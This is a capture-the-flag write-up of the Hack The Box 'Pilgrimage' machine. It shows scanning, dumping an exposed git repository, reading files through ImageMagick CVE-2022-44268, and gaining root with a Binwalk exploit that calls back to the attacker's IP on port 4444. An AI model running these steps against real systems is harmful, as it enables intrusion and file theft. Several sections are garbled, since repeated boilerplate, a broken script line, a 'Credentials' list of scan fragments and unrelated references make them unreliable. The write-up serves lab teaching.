---
title: "HackTheBox - Pilgrimage (Linux)"
date: 2026-02-27
description: "Hack The Box Pilgrimage Linux writeup with service enumeration, foothold strategy, and privilege escalation path."
categories: [HackTheBox, Linux]
tags: [php, privilege-escalation, rce]
mermaid: true
content_lang: en
alt_ja: /posts/htb-pilgrimage-ja/
---

## Overview

| Field                     | Value |
|---------------------------|-------|
| OS                        | Linux |
| Difficulty                | Not specified |
| Attack Surface            | 22/tcp (ssh), 80/tcp (http) |
| Primary Entry Vector      | Public exploit path involving CVE-2022-44268 |
| Privilege Escalation Path | Local misconfiguration and credential reuse for privilege escalation |

## Reconnaissance

- rustscan
- nmap
- gitdumper.sh
- extractor.sh
- magick
- Imagemagic
- cargo
- convert
- identify
This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
rustscan -a $ip -r 1-65535 --ulimit 5000
```

```bash
✅[1:12][CPU:11][MEM:35][TUN0:10.10.14.140][/home/n0z0]
🐉 > rustscan -a $ip -r 1-65535 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TreadStone was here 🚀

[~] The config file is expected to be at "/home/n0z0/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.242.27:22
Open 10.129.242.27:80
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-08 01:12 JST
Initiating Ping Scan at 01:12
Scanning 10.129.242.27 [4 ports]
Completed Ping Scan at 01:12, 0.41s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:12
Completed Parallel DNS resolution of 1 host. at 01:12, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 4, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 01:12
Scanning 10.129.242.27 [2 ports]
Discovered open port 22/tcp on 10.129.242.27
Discovered open port 80/tcp on 10.129.242.27
Completed SYN Stealth Scan at 01:12, 0.28s elapsed (2 total ports)
Nmap scan report for 10.129.242.27
Host is up, received reset ttl 63 (0.35s latency).
Scanned at 2025-10-08 01:12:57 JST for 1s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.84 seconds
           Raw packets sent: 6 (240B) | Rcvd: 2628 (105.128KB)

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
grc nmap -p- -sC -sV -T4 -A -Pn "$ip" \
-oX "$HOME/work/scans/$(date +%Y%m%d-%H%M%S)_${ip}.xml"
```

```bash
✅[1:12][CPU:20][MEM:34][TUN0:10.10.14.140][/home/n0z0]
🐉 > grc nmap -p- -sC -sV -T4 -A -Pn "$ip" \
  -oX "$HOME/work/scans/$(date +%Y%m%d-%H%M%S)_${ip}.xml"
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-08 01:12 JST
Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 25.62% done; ETC: 01:16 (0:02:25 remaining)
Warning: 10.129.242.27 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.242.27
Host is up (0.26s latency).
Not shown: 65500 closed tcp ports (reset), 33 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT       ADDRESS
1   254.43 ms 10.10.14.1
2   255.49 ms 10.129.242.27

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 711.42 seconds

```

💡 Why this works  
High-quality reconnaissance turns broad network exposure into a short list of exploitable paths. Service/version context allows precision targeting instead of blind exploitation attempts.

## Initial Foothold

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
git clone https://github.com/internetwache/GitTools.git
cd GitTools/Dumper
./gitdumper.sh http://10.129.242.27/.git/ /tmp/pilgrimage_git

cd ../Extractor
./extractor.sh /tmp/pilgrimage_git /tmp/pilgrimage_repo
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
./gitdumper.sh 10.129.231.224:80/.git/ ~/work/htb/Pilgrimage/pilgrimage_git 

./extractor.sh ../../pilgrimage_git/ ../../pilgrimage_repo 
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
ls -la
```

```bash
✅[13:37][CPU:1][MEM:45][TUN0:10.10.14.140][...12efdcb15476f9c994e3634a7]
🐉 > ls -la
合計 26972
drwxrwxr-x 4 n0z0 n0z0     4096 10月 13 13:24 .
drwxrwxr-x 3 n0z0 n0z0     4096 10月 13 13:24 ..
drwxrwxr-x 6 n0z0 n0z0     4096 10月 13 13:24 assets
-rw-rw-r-- 1 n0z0 n0z0      205 10月 13 13:24 commit-meta.txt
-rw-rw-r-- 1 n0z0 n0z0     5538 10月 13 13:24 dashboard.php
-rw-rw-r-- 1 n0z0 n0z0     9250 10月 13 13:24 index.php
-rw-rw-r-- 1 n0z0 n0z0     6822 10月 13 13:24 login.php
-rw-rw-r-- 1 n0z0 n0z0       98 10月 13 13:24 logout.php
-rwxr-xr-x 1 n0z0 n0z0 27555008 10月 13 13:24 magick
-rw-rw-r-- 1 n0z0 n0z0     6836 10月 13 13:24 register.php
drwxrwxr-x 4 n0z0 n0z0     4096 10月 13 13:24 vendor
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
./magick --version
```

```bash
✅[13:37][CPU:1][MEM:45][TUN0:10.10.14.140][...12efdcb15476f9c994e3634a7]
🐉 > ./magick --version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)

```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
python3 -c 'print(bytes.fromhex("726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f726b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d64205265736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e697a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a783a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a3939383a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a").decode("utf-8"))'
```

```bash
🐉 > python3 -c 'print(bytes.fromhex("726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f726b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d64205265736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e697a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a783a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a3939383a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a").decode("utf-8"))'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
python3 -c 'print(bytes.fromhex("text").decode("utf-8"))'
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
cat dashboard.php
```

```bash
✅[15:47][CPU:1][MEM:52][TUN0:10.10.14.140][...12efdcb15476f9c994e3634a7]
🐉 > cat dashboard.php                            
<?php
session_start();
if(!isset($_SESSION['user'])) {
  header("Location: /login.php");
  exit(0);
}

function returnUsername() {
  return "\"" . $_SESSION['user'] . "\"";
}

function fetchImages() {
  $username = $_SESSION['user'];
  $db = new PDO('sqlite:/var/db/pilgrimage');
  $stmt = $db->prepare("SELECT * FROM images WHERE username = ?");
  $stmt->execute(array($username));
  $allImages = $stmt->fetchAll(\PDO::FETCH_ASSOC);
  return json_encode($allImages);
}

```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
cargo run "/var/db/pilgrimage"
convert image.png -resize 50% output.png
identify -verbose output.png
wget http://pilgrimage.htb/shrunk/68ec9cbd1a14d.png
```

```bash
✅[15:30][CPU:3][MEM:51][TUN0:10.10.14.140][...Pilgrimage/CVE-2022-44268]
🐉 > cargo run "/var/db/pilgrimage"
    Finished `dev` profile [unoptimized + debuginfo] target(s) in 0.01s
     Running `target/debug/cve-2022-44268 /var/db/pilgrimage`

✅[15:31][CPU:1][MEM:51][TUN0:10.10.14.140][...Pilgrimage/CVE-2022-44268]
🐉 > convert image.png -resize 50% output.png

✅[15:31][CPU:2][MEM:50][TUN0:10.10.14.140][...Pilgrimage/CVE-2022-44268]
🐉 > identify -verbose output.png

✅[15:31][CPU:0][MEM:50][TUN0:10.10.14.140][...Pilgrimage/CVE-2022-44268]
🐉 > wget http://pilgrimage.htb/shrunk/68ec9cbd1a14d.png

✅[15:31][CPU:12][MEM:52][TUN0:10.10.14.140][...Pilgrimage/CVE-2022-44268]
🐉 > identify -verbose output.png

```

![Screenshot showing exploitation evidence on pilgrimage (step 1)](/assets/img/htb/pilgrimage/Pasted%20image%2020251013154717.png)
*Caption: Screenshot captured during pilgrimage at stage 1 of the attack chain.*

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
cat user.txt
id
uname -n
ip a
```

```bash
emily@pilgrimage:~$ cat user.txt 
0fbdde2fefca7f85d37725747b633547
emily@pilgrimage:~$ id
uid=1000(emily) gid=1000(emily) groups=1000(emily)
emily@pilgrimage:~$ uname -n
pilgrimage
emily@pilgrimage:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:a2:19 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.129.231.224/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 2570sec preferred_lft 2570sec
emily@pilgrimage:~$ 

```

![Screenshot showing exploitation evidence on pilgrimage (step 2)](/assets/img/htb/pilgrimage/Pasted%20image%2020251013184243.png)
*Caption: Screenshot captured during pilgrimage at stage 2 of the attack chain.*

### CVE Notes

- **CVE-2022-44268**: An ImageMagick issue that allows arbitrary file disclosure via crafted image metadata processing.
- **CVE-2022-4510**: A known vulnerability referenced in this chain and used as part of exploitation.

💡 Why this works  
Initial access succeeds when a real weakness is chained to controlled execution, credential theft, or authenticated pivoting. Captured outputs and callbacks validate that compromise is reproducible.

## Privilege Escalation

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
root         623  0.0  0.0   6816  2952 ?        Ss   00:59   0:00 /bin/bash /usr/sbin/malwarescan.sh
root         642  0.0  0.0   2516   776 ?        S    00:59   0:00  _ /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
root         643  0.0  0.0   6816  2364 ?        S    00:59   0:00  _ /bin/bash /usr/sbin/malwarescan.sh

```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
cat /usr/sbin/malwarescan.sh
```

```bash
emily@pilgrimage:/tmp$ cat /usr/sbin/malwarescan.sh

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
	filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
	binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
		if ; then
			/usr/bin/rm "$filename"
			break
		fi
	done
done

```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
/usr/local/bin/binwalk --help
```

```bash
emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ /usr/local/bin/binwalk --help

Binwalk v2.3.2
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk
```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
searchsploit binwalk
```

```bash
❌[19:24][CPU:23][MEM:48][TUN0:10.10.14.140][...12efdcb15476f9c994e3634a7]
🐉 > searchsploit binwalk                
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Binwalk v2.3.2 - Remote Command Execution (RCE)                                                                                      | python/remote/51249.py
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
python3 51249.py orig.png 10.10.14.140 4444
```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
scp ./binwalk_exploit.png emily@$ip:/tmp/binwalk_exploit.png 
```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
cat root.txt
id
uname -n
ip a
```

```bash
root@pilgrimage:~# cat root.txt
05f6588ee6f8c8e98514b35e55096b69
root@pilgrimage:~# id
uid=0(root) gid=0(root) groups=0(root)
root@pilgrimage:~# uname -n
pilgrimage
root@pilgrimage:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:a2:19 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.129.231.224/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 2099sec preferred_lft 2099sec
root@pilgrimage:~# 

```

![Screenshot showing exploitation evidence on pilgrimage (step 1)](/assets/img/htb/pilgrimage/Pasted%20image%2020251013194348.png)
*Caption: Screenshot captured during pilgrimage at stage 1 of the attack chain.*

💡 Why this works  
Privilege escalation depends on trust boundary mistakes such as unsafe sudo rules, writable execution paths, SUID abuse, or credential reuse. Enumerating and validating these conditions is essential for reliable root/administrator access.

## Credentials

- `Tool / Command`
- `home/n0z0]`
- `__  /  ___}`
- `github.com/RustScan/RustScan`
- `home/n0z0/.rustscan.toml"`
- `22/tcp`
- `80/tcp`
- `HOME/work/scans/$(date`
- `nginx/1.18.0`

## Lessons Learned / Key Takeaways

- Validate external attack surface continuously, especially exposed admin interfaces and secondary services.
- Harden secret handling and remove plaintext credentials from reachable paths and backups.
- Limit privilege boundaries: audit SUID binaries, sudo rules, and delegated scripts/automation.
- Keep exploitation evidence reproducible with clear command logs and result validation at each stage.

## References

- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- HackTricks Linux Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
- GTFOBins: https://gtfobins.org/
- Certipy: https://github.com/ly4k/Certipy
- BloodHound: https://github.com/BloodHoundAD/BloodHound
- CVE-2022-44268: https://nvd.nist.gov/vuln/detail/CVE-2022-44268
- CVE-2022-4510: https://nvd.nist.gov/vuln/detail/CVE-2022-4510
